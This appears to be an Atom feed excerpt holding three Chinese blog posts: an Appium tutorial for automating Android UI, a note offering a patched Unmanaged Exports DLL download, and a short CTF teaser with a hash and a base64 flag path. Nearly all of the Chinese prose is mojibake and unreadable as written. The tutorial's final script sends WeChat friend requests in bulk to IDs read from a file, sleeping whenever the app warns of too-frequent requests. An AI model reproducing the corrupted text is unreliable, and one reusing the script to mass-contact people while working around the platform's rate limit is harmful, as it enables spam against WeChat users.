<p>Android UIæµ‹è¯•å·¥å…·æœ‰å¾ˆå¤šç§ï¼Œå¦‚Monkey, UIAutomator, Selendroid,Â Robotiumç­‰ã€‚å…¶ä¸­UIAutomator,Â Monkey,Â Selendroidå‡ä¸ºéä¾µå…¥å¼çš„UIæµ‹è¯•ï¼Œä¹Ÿå°±æ˜¯ä¸éœ€è¦ä¿®æ”¹æºä»£ç ï¼Œåªè¦å®‰è£…äº†ç›®æ ‡ç¨‹åºå°±å¯ä»¥è¿›è¡Œæµ‹è¯•ã€‚Robotiuméœ€è¦ä¸æºç ä¸€åŒç¼–è¯‘æµ‹è¯•ã€‚Appiumå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªæµ‹è¯•å·¥å…·çš„ç»Ÿä¸€è°ƒåº¦è½¯ä»¶ï¼Œå°†ä¸åŒçš„éä¾µå…¥å¼æµ‹è¯•å·¥å…·æ•´åˆåœ¨ä¸€èµ·ï¼Œå¯¹å¤–æä¾›ç»Ÿä¸€çš„APIã€‚åœ¨Android 2.3ä»¥å‰çš„ç‰ˆæœ¬ï¼ŒAppiumä¼šè°ƒç”¨Selendroidï¼Œä¹‹åçš„ç‰ˆæœ¬ä¼šç›´æ¥ä½¿ç”¨UIAutomatorï¼ŒiOSä¸‹ä½¿ç”¨UIAutomationã€‚Appiumè¿˜æ”¯æŒFirefoxOSçš„UIæµ‹è¯•ã€‚</p>
<figure style="width: 347px" class="wp-caption alignnone"><img class="" src="https://dn-summershrimp-my-blog.qbox.me/appium.gif" width="347" height="614" /><figcaption class="wp-caption-text">Appium Gif</figcaption></figure>
<h2>å®‰è£…Appium</h2>
<p>å®˜ç½‘ç»™å‡ºäº†å‘½ä»¤è¡Œä¸‹çš„å®‰è£…æ–¹æ³•ã€‚ä½†å®é™…ä¸ŠAppiumæœ‰GUIç‰ˆæœ¬ï¼Œæ›´é€‚åˆåœ¨Windows/MacOSä¸‹ä½¿ç”¨ã€‚Windowsä¸‹éœ€è¦å®‰è£….NET Frameworkã€‚</p>
<pre class="lang:default decode:true">&gt; brew install node      # get node.js
&gt; npm install -g appium  # get appium
&gt; npm install wd         # get appium client
&gt; appium &amp;               # start appium
&gt; node your-appium-test.js</pre>
<p>Appiuméœ€è¦ä¾èµ–Android SDKç¼–è¯‘åœ¨æ‰‹æœºç«¯è¿è¡Œçš„ä¸¤ä¸ªæ’ä»¶ï¼Œå› æ­¤éœ€è¦é¦–å…ˆå®‰è£…ç›¸åº”çš„Android SDKç‰ˆæœ¬ã€‚è¿™é‡Œç›´æ¥ä½¿ç”¨äº†Android Studioä¸­è‡ªå¸¦çš„SDK Managerã€‚åœ¨SDKManagerä¸­é€‰æ‹©å’Œæµ‹è¯•æœºç›¸å¯¹åº”çš„SDK Platformå’Œè¾ƒæ–°çš„Build-toolsï¼Œå¦‚æœéœ€è¦ä½¿ç”¨æ¨¡æ‹Ÿå™¨æµ‹è¯•è¿˜è¦è£…å¯¹åº”çš„ARM/x86 System Imageï¼Œä»¥åŠIntel HAXM Installerï¼Œç”¨äºåŠ é€Ÿx86è™šæ‹Ÿæœºã€‚Appiumä½¿ç”¨adbæ¥ä¸ç›®æ ‡æœºå™¨é€šè®¯ï¼Œå› æ­¤å¯¹äºçœŸæœºå’Œæ¨¡æ‹Ÿå™¨æ“ä½œå‡ ä¹éƒ½æ˜¯ç›¸åŒçš„ï¼Œå¦‚ä½•å»ºç«‹æ¨¡æ‹Ÿå™¨åœ¨æ­¤ä¸å†èµ˜è¿°ã€‚</p>
<p>å®‰è£…å®Œæˆåéœ€è¦åœ¨Appium GUIä¸­é…ç½®Android SDKç›®å½•ï¼Œéšåé€‰æ‹©Androidï¼Œç‚¹å‡»Launchå°±å¯ä»¥å¯åŠ¨Appium Serverã€‚</p>
<p><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk.png"><img class="alignnone size-medium wp-image-102" src="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-280x300.png" alt="Appium-android-sdk" width="280" height="300" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-280x300.png 280w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-768x823.png 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-956x1024.png 956w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk.png 1333w" sizes="(max-width: 280px) 100vw, 280px" /></a><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch.png"><img class="alignnone size-medium wp-image-103" src="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-300x263.png" alt="Appium-launch" width="300" height="263" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-300x263.png 300w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-768x672.png 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-1024x896.png 1024w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch.png 1332w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>Appium Serveré»˜è®¤ä¼šç›‘å¬http://localhost:4723 ï¼Œç”¨äºRPCé€šè®¯ã€‚ä¸‹é¢æˆ‘ä»¬å°±å¯ä»¥æ‰“å¼€ç†Ÿæ‚‰çš„ç¼–ç¨‹ç¯å¢ƒï¼Œç¼–å†™UIæµ‹è¯•ç”¨ä¾‹äº†ã€‚è¿™é‡Œä½¿ç”¨Pythonè¿›è¡Œç¼–å†™ï¼Œéœ€è¦å…ˆå®‰è£…Appiumçš„Python Client Â ï¼Œç„¶åå†pythonä¸­ä½¿ç”¨appium.webclientå°±å¯ä»¥è¿æ¥Appium serveräº†ã€‚</p>
<pre class="lang:default decode:true">pip install Appium-Python-Client</pre>
<h2>ä½¿ç”¨Appiumè¿›è¡ŒUIæ§åˆ¶</h2>
<p>æ ¹æ®æ³¨é‡Šä¿®æ”¹ç›¸åº”å±æ€§åå³å¯è¿è¡Œæµ‹è¯•ã€‚æ‰‹æœºéœ€è¦æ‰“å¼€ADBè°ƒè¯•ï¼Œæ‰§è¡Œå®Œä»¥ä¸‹ä»£ç åï¼ŒAppiumä¼šåœ¨æ‰‹æœºä¸Šå®‰è£…Appium Settingså’ŒUnlockä¸¤ä¸ªç¨‹åºï¼Œéšåå¾®ä¿¡ä¼šè¢«å¯åŠ¨ã€‚</p>
<pre class="lang:python decode:true">from appium import webdriver

desired_caps = {}
desired_caps['platformName'] = 'Android'  #æµ‹è¯•å¹³å°
desired_caps['platformVersion'] = '5.1'   #å¹³å°ç‰ˆæœ¬
desired_caps['deviceName'] = 'm3_note'    #è®¾å¤‡åç§°ï¼Œå¤šè®¾å¤‡æ—¶éœ€åŒºåˆ†
desired_caps['appPackage'] = 'com.tencent.mm'  #app packageå
desired_caps['appActivity'] = '.ui.LauncherUI' #appé»˜è®¤Activity
dr = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) #å¯åŠ¨Remote RPC
</pre>
<p>Selenum Webdriverä½¿ç”¨äº†ä¸€ç§ç±»ä¼¼äºJSä¸­çš„DOMæ¨¡å‹çš„æ–¹æ³•æ¥é€‰æ‹©é¡µé¢ä¸­çš„å…ƒç´ ã€‚drä¸ºå½“å‰æ­£åœ¨æ´»åŠ¨çš„activityå¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨findElementByXXXçš„æ–¹æ³•æ¥è·å–Activityä¸­çš„å…ƒç´ ã€‚æ‰€æœ‰Elementåå¸¦sçš„å‡½æ•°ï¼Œå‡è·å¾—æ‰€æœ‰åŒ¹é…çš„å…ƒç´ ï¼Œä¸å¸¦sçš„å‡½æ•°è·å¾—ç¬¬ä¸€ä¸ªåŒ¹é…çš„å…ƒç´ ã€‚</p>
<h3>æŸ¥è¯¢å‡½æ•°</h3>
<h4>1. findElement(s)ByName</h4>
<p>åœ¨Androidä¸­åŸºæœ¬æ²¡ç”¨ã€‚Android UIæ²¡æœ‰Nameè¿™ä¸ªå±æ€§ã€‚æœ‰è¯´å¯ä»¥ä½¿ç”¨textå€¼è·å–ã€‚ä½†æˆ‘å¹¶æ²¡æœ‰æˆåŠŸ</p>
<h4>2. findElement(s)ByClassName</h4>
<p>é€šè¿‡ç±»åæ¥è·å–å…ƒç´ ï¼Œç”¨æ³•å¦‚ä¸‹ï¼š</p>
<pre class="lang:python decode:true ">item_list = dr.find_elements_by_class_name("android.widget.LinearLayout")
item_list[2].click()</pre>
<h4>3. findElementById</h4>
<p>é€šè¿‡resource_idæ¥è·å–å…ƒç´ ï¼Œæ¯ä¸ªActivityä¸­éƒ½æ˜¯å”¯ä¸€çš„ï¼Œç”¨æ³•å¦‚ä¸‹</p>
<pre class="lang:python decode:true">t = dr.find_element_by_id("com.tencent.mm:id/f7")
t.send_keys(wechatId)</pre>
<h4>4. findElement(s)ByAccessbiltiyId</h4>
<p>åœ¨Androidä¸ŠAccessbilityIDå®é™…å°±æ˜¯contentDescriptionã€‚è¿™ä¸ªå±æ€§æ˜¯ä¸ºäº†æ–¹ä¾¿è§†åŠ›å—æŸäººå£«ä½¿ç”¨æ‰‹æœºæ‰€è®¾ç½®ã€‚å¼€å¯TTSåç³»ç»Ÿä¼šæœ—è¯»ç›¸å…³æ§ä»¶çš„contentDescriptionã€‚</p>
<h4>5. findElement(s)ByXPath</h4>
<p>é€šè¿‡XML Pathæè¿°æ¥å¯»æ‰¾å…ƒç´ ã€‚æˆ‘æ²¡æœ‰æˆåŠŸçš„è·å–åˆ°ï¼Œå¯èƒ½æ˜¯XPathå†™çš„æœ‰é—®é¢˜ã€‚</p>
<pre class="lang:python decode:true">s = dr.find_element_by_xpath("//android.widget.TextView[contains(@text,'æœç´¢')]")
s.click()</pre>
<h4>6. findElementByAndroidUIAutomator</h4>
<p>é€šè¿‡UIAutomatorçš„é€‰æ‹©å™¨æ¥è·å–å…ƒç´ ã€‚å› ä¸ºAppiumåœ¨Androidä¸Šå®é™…æ˜¯è°ƒç”¨çš„UIAutomatorï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡UIAutomatorçš„é€‰æ‹©å™¨æ¥é€‰æ‹©å…ƒç´ ã€‚</p>
<pre class="lang:python decode:true ">el = dr.find_element_by_android_ui_automator("new UiSelector().text(\"æœç´¢\")")
el.click()</pre>
<h3>æ“ä½œå‡½æ•°</h3>
<p>æ“ä½œå‡½æ•°ç”¨äºæ“ä½œé€‰å®šçš„å…ƒç´ ï¼Œæœ‰å¾ˆå¤šï¼Œä»¥ä¸‹ä»…åˆ—ä¸¾å‡ ä¸ªï¼Œæ›´å¤šçš„è¯·æŸ¥é˜…æ‰‹å†Œã€‚</p>
<ol>
<li>click</li>
<li>send_keys</li>
<li>clear</li>
</ol>
<p>æŸ¥è¯¢å‡½æ•°è¿”å›çš„å…ƒç´ å¯¹è±¡å¯ä»¥åƒJSä¸­çš„domå…ƒç´ ä¸€æ ·ï¼Œç»§ç»­ä½¿ç”¨æŸ¥è¯¢å‡½æ•°æ¥é€‰å®šå…¶å­å…ƒç´ ã€‚ç”¨ä¾‹å¦‚ä¸‹ã€‚</p>
<pre class="lang:python decode:true">search = dr.find_element_by_id("com.tencent.mm:id/aqw").find_element_by_class_name("android.widget.RelativeLayout")
search.click()</pre>
<h2>å¦‚ä½•ç¡®å®šæŸ¥è¯¢è§„åˆ™</h2>
<p>äº†è§£äº†ç›¸å…³çš„å‡½æ•°åï¼Œä¸‹é¢å°±åº”å¯¹UIè¿›è¡Œå®šä½äº†ã€‚å¦‚æœæ˜¯è‡ªå·±å›¢é˜Ÿå¼€å‘çš„ç¨‹åºï¼Œæ¨èè®©å¼€å‘åŒå­¦åœ¨æ‰€æœ‰çš„ç©ºé—´ä¸Šéƒ½æ·»åŠ resource_idè¿›è¡Œç»å¯¹å®šä½ã€‚å¦‚æœç¢°åˆ°æ²¡æœ‰è°ˆä»·resource_idçš„å…ƒç´ ï¼Œé‚£å°±è¦ä½¿ç”¨åˆ«çš„åŠæ³•è¿›è¡Œå®šä½äº†ã€‚</p>
<h3>1. UI Automator Viewer</h3>
<p>UI Automator Vieweræ˜¯Androidå®˜æ–¹çš„UIå®šä½å·¥å…·ï¼Œä½äºsdk/toolsä¸‹ã€‚è¿è¡Œåä¼šæ‰“å¼€viewerç•Œé¢ã€‚ç‚¹å‡»è·å–æŒ‰é’®å³å¯è·å–å½“å‰æ­£åœ¨è¿è¡Œçš„Activityçš„UIç»“æ„ã€‚</p>
<p><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer.png"><img class="alignnone size-medium wp-image-104" src="https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-300x225.png" alt="uiviewer" width="300" height="225" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-300x225.png 300w, https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-768x576.png 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-1024x768.png 1024w, https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer.png 1600w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<h3>2. AppiumDriver getPageSource</h3>
<p>AppiumDriver(Client) å¯ä»¥å¾ˆæ–¹ä¾¿çš„è·å¾—å½“å‰æ­£åœ¨è¿è¡Œçš„Activityçš„UIæè¿°ï¼Œéšåå¯æ ¹æ®è¿”å›çš„XMLæ–‡æ¡£æ¥å¯»æ‰¾å…ƒç´ ã€‚</p>
<pre class="lang:python decode:true">print dr.page_source</pre>
<p><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062.jpg"><img class="alignnone size-medium wp-image-108" src="https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-300x178.jpg" alt="getSource" width="300" height="178" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-300x178.jpg 300w, https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-768x456.jpg 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-1024x608.jpg 1024w, https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062.jpg 1261w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>(å›¾ç‰‡ä¸ä»–äººï¼Œä¾µåˆ )</p>
<p>ç¡®å®šå…ƒç´ ä½ç½®åï¼Œå³å¯æ ¹æ®å‰è¿°çš„Findæ–¹æ³•æ¥æŸ¥æ‰¾/é€‰æ‹©å…ƒç´ </p>
<h2>ç¼–å†™å®Œæ•´çš„æµ‹è¯•ä»£ç </h2>
<p>æ­£ç¡®çš„è·å–å…ƒç´ ä¹‹åä¾¿å¯ä»¥è·å–å…ƒç´ ç›¸å…³çš„ä¿¡æ¯ï¼Œéšåä½¿ç”¨å„è¯­è¨€å¸¸ç”¨çš„æµ‹è¯•æ¡†æ¶ç¼–å†™æµ‹è¯•å³å¯ï¼Œå¦‚Javaçš„JUnitï¼ŒNodejsçš„Mochaç­‰ã€‚</p>
<p>è¿™é‡Œæˆ‘ä½¿ç”¨Appiumä¸»è¦æ˜¯ä¸ºäº†æ¨¡æ‹Ÿç”¨æˆ·ç‚¹å‡»æ·»åŠ å¾®ä¿¡å¥½å‹ï¼Œæ‰€ä»¥å®Œæ•´çš„ç¨‹åºå¹¶æ²¡æœ‰ä½¿ç”¨åˆ°æµ‹è¯•æ¡†æ¶ã€‚ç›¸å…³çš„UIå…ƒç´ è·å–/æ“ä½œæ–¹æ³•ä¾›å¤§å®¶å‚è€ƒã€‚</p>
<pre class="lang:python decode:true "># coding:utf-8
from appium import webdriver
from time import sleep


def addFriend(dr, id, dryRun=False):
    succ = False
    wechatId = str(id)
    dr.find_element_by_accessibility_id(r"æ›´å¤šåŠŸèƒ½æŒ‰é’®").click()
    item_list = dr.find_elements_by_class_name("android.widget.LinearLayout")
    try:
        item_list[2].click()
    except:
        print "Error! in item list len"
        return succ
    el = dr.find_element_by_class_name("android.widget.ListView")
    item_list = el.find_elements_by_class_name("android.widget.LinearLayout")
    try:
        item_list[1].click()
    except:
        print "Error! in item list len"
        return succ
    t = dr.find_element_by_id("com.tencent.mm:id/f7")
    t.send_keys(wechatId)
    search = dr.find_element_by_id("com.tencent.mm:id/aqw").find_element_by_class_name("android.widget.RelativeLayout")
    search.click()
    try:
        freq = dr.find_element_by_id('com.tencent.mm:id/aqq')
        assert freq.text == u"æ“ä½œè¿‡äºé¢‘ç¹ï¼Œè¯·ç¨åå†è¯•ã€‚"
        print "Frequency too high! Sleep 300s"
        sleep(60)
        return succ
    except:
        pass

    try:
        dr.find_element_by_id('com.tencent.mm:id/a8x').click()
        addBtn = dr.find_element_by_id('com.tencent.mm:id/eu')
        if not dryRun:
            addBtn.click()
            succ = True
        print "Success Send Requests:" + wechatId
    except:
        print "No Such User Or Already a Friend:" + wechatId

    while True:
        try:
            dr.find_element_by_id('com.tencent.mm:id/fb').click()
        except:
            try:
                dr.find_element_by_id('com.tencent.mm:id/f4').click()
            except:
                break
    return True

def resetActivity(dr, desired_caps):
    dr.start_activity(desired_caps['appPackage'], desired_caps['appActivity'])

desired_caps = {}
desired_caps['platformName'] = 'Android'
desired_caps['platformVersion'] = '5.1'
desired_caps['deviceName'] = 'm3_note'
desired_caps['appPackage'] = 'com.tencent.mm'
desired_caps['appActivity'] = '.ui.LauncherUI'
print "Trying connect to phone..."
dr = {}
try:
    dr = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps)
except Exception, e:
    print "Cannot Connect to phone :", e
    exit()
print "Successfully connect to phone."
print "Reading friend list..."
friendList = []
fp = open("friends.txt")
line = fp.readline().strip()
while line:
    friendList.append(line)
    line = fp.readline().strip()
print "Finish reading friends. Total: " + str(len(friendList))
print "Wait for Wechat's splash screen...."
for i in range(0, 10):
    print 10 - i
    sleep(1)
succ_list = []
fail_list = []
for i in friendList:
    try:
        succ = addFriend(dr, i, dryRun=False)
        if succ:
            succ_list.append(i)
        else:
            fail_list.append(i)
    except:
        fail_list.append(i)
        resetActivity(dr, desired_caps)

print "Succeed List:"
print "\n".join(succ_list)
print "Failed List:"
print "\n".join(fail_list)

dr.close()</pre>
<p>&nbsp;</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/unmanaged-exports.html</id>
        <title><![CDATA[Unmanaged Exports ä¿®æ­£ç‰ˆ .NETå¯¼å‡ºéæ‰˜ç®¡å‡½æ•°]]></title>
        <updated>2016-06-19T07:05:21+08:00</updated>
        <link href="https://www.noisyfox.io/unmanaged-exports.html"/>
        <content type="text/html" src="https://www.noisyfox.io/unmanaged-exports.html"><![CDATA[<p>Unmanaged Exports æ˜¯ä¸€ä¸ªå°†.NETç¼–å†™çš„é™æ€æ‰˜ç®¡å‡½æ•°å¯¼å‡ºæˆå¯ä¾›C/C++ç­‰ç›´æ¥è°ƒç”¨çš„éæ‰˜ç®¡å‡½æ•°çš„å·¥å…·ã€‚</p>
<hr />
<h2>å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ</h2>
<p>åˆ›å»ºä¸€ä¸ªæ–°çš„æˆ–è€…ä¿®æ”¹å·²ç»å­˜åœ¨çš„ç±»åº“ã€‚<br />
ç„¶ååŠ å…¥ UnmanagedExports <a href="https://nuget.org/packages/UnmanagedExports" target="_blank">Nuget åŒ…</a>ã€‚<br />
è¿™åŸºæœ¬å°±æ˜¯æ‰€æœ‰è¦åšçš„äº‹æƒ…äº†ã€‚<br />
ç„¶åä½ å°±å¯ä»¥éšä¾¿å†™ä¸€äº›é™æ€æ–¹æ³•ï¼Œç”¨[DllExport]è£…é¥°å®ƒï¼Œç„¶ååœ¨åŸç”Ÿä»£ç ä¸­ä½¿ç”¨äº†ã€‚<br />
å®ƒå¾ˆåƒ DllImportï¼Œä½ å¯ä»¥ç”¨MarshalAsAttributeæ¥å®šä¹‰è¯¥å‡½æ•°çš„å‚æ•°å’Œç»“æœçš„æ ¼å¼ã€‚<br />
åœ¨ç¼–è¯‘æ—¶ï¼Œè¿™ä¸ªå·¥å…·ä¼šè‡ªåŠ¨ä¿®æ”¹ILä»£ç å¢åŠ å¯¼å‡ºå£°æ˜ã€‚</p>
<h2>é™åˆ¶</h2>
<ul>
<li>ä½ ä¸èƒ½å¯¼å‡ºåœ¨åŒä¸€ä¸ªclassä¸­çš„é‡è½½å‡½æ•°ï¼Œå³ä¾¿ä½ æŒ‡å®šäº†ä¸åŒçš„å¯¼å‡ºåç§°ã€‚</li>
<li>å¦ä¸€ä¸ªé™åˆ¶æ˜¯ä½ ä¸èƒ½é€’å½’è°ƒç”¨å¯¼å‡ºå‡½æ•°ã€‚</li>
</ul>
<p>è¿™çœ‹èµ·æ¥æ˜¯è¿è¡Œæ—¶çš„é™åˆ¶ï¼Œå¹¶ä¸”æˆ‘å¹¶ä¸æƒ³ä¸ºäº†è§„é¿è¿™äº›é™åˆ¶è€Œå†æŠŠä½ çš„å‡½æ•°åšä¸€æ¬¡åŒ…è£…ã€‚</p>
<hr />
<p>é¦–å…ˆç”¨C#ï¼ˆå…¶å®ƒ.NETè¯­è¨€ä¹Ÿå¯ï¼‰åˆ›å»ºä¸€ä¸ªwindowsç»å…¸æ¡Œé¢dllï¼Œç„¶ååœ¨Nugetä¸­æœç´¢å¹¶å®‰è£…Unmanaged Exportsè¿™ä¸ªåŒ…ã€‚</p>
<p>éšåç¼–å†™ä½ è¦å¯¼å‡ºçš„é™æ€å‡½æ•°ï¼Œå¹¶æ·»åŠ [DllExport]æ³¨è§£ï¼ŒèŒƒä¾‹å¦‚ä¸‹ï¼š</p>
<p><pre data-enlighter-language="csharp" class="EnlighterJSRAW">
class Test
{
  [DllExport(&quot;add&quot;, CallingConvention = CallingConvention.Cdecl)]
  public static int TestExport(int left, int right)
  {
     return left + right;
  } 
}
</pre></p>
<p>ç„¶åç”Ÿæˆå¹³å°é€‰æ‹©ä¸€ä¸ªå…·ä½“çš„å¹³å°ï¼ˆä¸èƒ½æ˜¯AnyCPUå¦åˆ™è¯¥å·¥å…·ä¸ç”Ÿæ•ˆï¼‰ï¼Œç”Ÿæˆè§£å†³æ–¹æ¡ˆå³å¯ã€‚<br />
è¯¥å·¥å…·æœ€æ–°ç‰ˆåªæ”¯æŒvs2008ä»¥åçš„vsï¼Œå› ä¸ºvs2008åŠä»¥å‰çš„ç‰ˆæœ¬ä¸æ”¯æŒnugetã€‚</p>
<hr />
<p>å·¥å…·å®˜æ–¹ç½‘ç«™åŠè¯¦ç»†è¯´æ˜ï¼š<br />
<a href="https://sites.google.com/site/robertgiesecke/Home/uploads/unmanagedexports" target="_blank">https://sites.google.com/site/robertgiesecke/Home/uploads/unmanagedexports</a></p>
<hr />
<p>å…³äºç¼–è¯‘é”™è¯¯<br />
è¯¥å·¥å…·åœ¨éè‹±æ–‡æ“ä½œç³»ç»Ÿä¸Šå¯èƒ½ä¼šå‡ºç°ç¼–è¯‘é”™è¯¯çš„é—®é¢˜ï¼Œå…·ä½“è¡¨ç°å¦‚ä¸‹ï¼š<br />
<a href="http://stackoverflow.com/questions/20288469/cant-create-unmanaged-dll-using-c-sharp-and-robert-gieseckes-unmanaged-exports" target="_blank">http://stackoverflow.com/questions/20288469/cant-create-unmanaged-dll-using-c-sharp-and-robert-gieseckes-unmanaged-exports</a><br />
<a href="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQæˆªå›¾20160619143947.png"><img class="aligncenter size-full wp-image-402" src="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQæˆªå›¾20160619143947.png" alt="Unmanaged Exports ç¼–è¯‘é”™è¯¯" width="1452" height="90" /></a><br />
ä¸»è¦åŸå› æ˜¯å› ä¸ºéè‹±æ–‡æ“ä½œç³»ç»Ÿä¸­ILä»£ç ä¸­å«æœ‰éè‹±æ–‡æ³¨é‡Šå¯¼è‡´æ’ä»¶å·¥ä½œå¼‚å¸¸ã€‚<br />
è™½ç„¶å°†ç³»ç»Ÿè¯­è¨€åˆ‡æ¢æˆè‹±æ–‡å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿‡äºéº»çƒ¦ï¼Œæ•…æœ¬äººä¿®æ”¹äº†è¿™ä¸ªå·¥å…·ï¼Œä¿®æ­£äº†å…¶åœ¨éè‹±æ–‡æ“ä½œç³»ç»Ÿä¸Šä¸èƒ½æ­£å¸¸ä½¿ç”¨çš„é—®é¢˜ã€‚</p>
<p>æ–‡æœ«é™„ä¸Šä¿®æ”¹åçš„æ–‡ä»¶ï¼Œè§£å‹åå°†å…¶ä¸­çš„ä¸¤ä¸ªdllæ›¿æ¢è¿›é¡¹ç›®NuGetåŒ…ä¸­packages\UnmanagedExports.1.2.7\toolsæ–‡ä»¶å¤¹ä¸‹çš„ä¸¤ä¸ªåŒådllå³å¯ã€‚<br />
æ”¹ä¿®æ­£ç‰ˆä»…é’ˆå¯¹Unmanaged Exports 1.2.7ç‰ˆæœ¬åˆ¶ä½œï¼Œå…¶å®ƒç‰ˆæœ¬æœªæµ‹ï¼Œå¯èƒ½ä¸èƒ½æ­£å¸¸ä½¿ç”¨ã€‚<br />
æ›¿æ¢å®Œæˆåå³å¯æ­£å¸¸ç¼–è¯‘ï¼š<br />
<a href="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQæˆªå›¾20160619145913.png"><img class="aligncenter size-full wp-image-403" src="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQæˆªå›¾20160619145913.png" alt="Unmanaged Exports ç¼–è¯‘æ­£å¸¸" width="662" height="65" /></a><br />
<div class="sdm_download_item "><div class="sdm_download_item_top"><div class="sdm_download_thumbnail"></div><div class="sdm_download_title">DllExport-Fixed-1.2.7.7z</div></div><div style="clear:both;"></div><div class="sdm_download_description"><p>ä¿®æ­£äº†éè‹±æ–‡ç³»ç»Ÿç¼–è¯‘é”™è¯¯çš„Unmanaged Exports 1.2.7</p>
<h1></h1>
</div><div class="sdm_download_link"><span class="sdm_download_button"><a href="https://www.noisyfox.io/?smd_process_download=1&download_id=404" class="sdm_download green" title="DllExport-Fixed-1.2.7.7z" target="_blank">Download Now!</a></span><span class="sdm_download_item_count"><span class="sdm_item_count_number">881</span><span class="sdm_item_count_string"> Downloads</span></span></div></div><div class="sdm_clear_float"></div></p>
<p><a rel="nofollow" href="https://www.noisyfox.io/unmanaged-exports.html">Unmanaged Exports ä¿®æ­£ç‰ˆ .NETå¯¼å‡ºéæ‰˜ç®¡å‡½æ•°</a>ï¼Œé¦–å‘äº<a rel="nofollow" href="https://www.noisyfox.io">ç‹ç‹¸çš„å°å°çª</a>ã€‚</p>]]></content>
        <author>
            <name><![CDATA[ç‹ç‹¸çš„å°å°çª]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2016/04/nuaactf/</id>
        <title><![CDATA[095a655fc809cbbdffa207717a5233f5çš„åŸæ–‡æ˜¯ä»€ä¹ˆï¼Ÿ]]></title>
        <updated>2016-04-19T02:47:11+08:00</updated>
        <link href="https://www.summershrimp.com/2016/04/nuaactf/"/>
        <content type="text/html" src="https://www.summershrimp.com/2016/04/nuaactf/"><![CDATA[<p>095a655fc809cbbdffa207717a5233f5çš„åŸæ–‡æ˜¯</p>
<pre class="lang:default decode:true ">bnVhYWN0ZiU3Qi93ZWIyL2NlYmE2ZmJiZjBlZGU0MzI1MjY0MWNkMzM2ZTM2YTAzJTdE</pre>
<p>Happy NUAACTF!</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
</feed>